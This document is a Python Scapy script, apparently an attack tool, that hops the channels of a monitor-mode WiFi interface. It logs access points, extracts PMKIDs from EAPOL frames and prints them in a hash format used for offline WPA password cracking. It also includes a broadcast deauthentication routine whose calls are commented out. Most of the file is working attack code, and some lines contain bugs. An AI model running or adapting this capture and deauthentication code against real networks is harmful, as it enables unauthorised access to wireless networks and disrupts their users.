from scapy.all import *
import binascii
import netifaces
import random, time, sys
ap_pmk_list={}
iface="wlan1mon"
timeout=100

def write(pkt):
    wrpcap('filtered.pcap', pkt, append=True)


def deauth(pkt):
	sendp(RadioTap()/Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=pkt.addr2, addr3=pkt.addr3)/Dot11Deauth(),count=4, iface=iface, verbose=0)

def chg_cnl(channel):
		os.system("iw dev %s set channel %d" % (iface, channel))
		time.sleep(1)

def sniff_function(iface,func,timeout,ap_pmk_list):
    sniff(iface=iface, prn=func, timeout=timeout)
    ap_pmk_list=PacketHandler(pkt)

def PacketHandler (pkt):
    if pkt.haslayer (Dot11) :
        PMKID="Unknown"
        if pkt.type == 0 and pkt.subtype == 8 :
            #write(pkt)
            source = pkt.addr2
            dest = pkt.addr1
            pkt_essid=pkt.info
            #deauth(pkt)
            if ap_pmk_list.get(source) is None:
                if dest=="ff:ff:ff:ff:ff:ff":
                    ap_pmk_list[source]=[PMKID,source,mac,pkt.info]
                else:
                    ap_pmk_list[source] = [PMKID, source, dest, pkt.info]
                print "Available SSID: %s And its MAC addr: %s And my MAC addr: %s And dest MAC: %s" % (pkt_essid, source, mac, dest)
            else:
                if ap_pmk_list.get(source)[3] is None:
                    ap_pmk_list.get(source)[3]==pkt_essid


                #print "Available SSID: %s And its MAC addr: %s And my MAC addr: %s And dest MAC: %s" %(pkt_essid, source,mac,dest)
        if EAPOL in pkt:
            #write(pkt)
            #print ("FIND EAPOL")
            try:
                source = pkt.addr2
                dest = pkt.addr1
                if ap_pmk_list.get(source)[3] is not None:
                    pkt_essid=ap_pmk_list.get(source)[3]
                else:
                    ap_pmk_list(source)[3] = None
                    pkt_essid = ap_pmk_list.get(source)[3]
                tag_number=binascii.hexlify(pkt.getlayer(Raw).load)[190:192]
                if tag_number=="dd":
                    PMKID = binascii.hexlify(pkt.getlayer(Raw).load)[202:234]
                    #print PMKID
                    if PMKID=='':
                        PMKID="Unknown"
                        print ("FIND EAPOL WITHOUT PMKID IN " + str(pkt_essid) + " on mac " + str(source) + " with dest MAC " + str(dest))
                    else:
                        ap_pmk_list.get(source)[0]=PMKID
                        if str(pkt_essid)!="None":
                            print ("RESULT STRING on "+ str(pkt_essid))
                            print (str(PMKID)+"*"+str(source).replace(":","")+"*"+str(dest).replace(":","")+"*"+str(pkt_essid).encode("hex"))
                        else:
                            print ("FIND PMKID without ESSID name on mac" + str(dest))
                            print (str(PMKID) + "*" + str(source).replace(":", "") + "*" + str(dest).replace(":", "") + "*" + "NONE ESSID")
            except:
                pass


        #print ap_list



i=13
while True:
    if i%13==0:
        i += 1
        continue

    #os.system("macchanger -i %s" % (iface))
    mac = str(netifaces.ifaddresses(iface)[netifaces.AF_LINK])
    mac = mac[mac.find("addr") + 8:mac.rfind("'")]
    os.system("iw dev %s set channel %d" % (iface, i%13))
    sniff(iface=iface, prn=PacketHandler,timeout=timeout)
    i += 1
    current=os.system('iwlist %s channel | grep Current' % (iface))

#sniff(iface = iface , prn = PacketHandler)

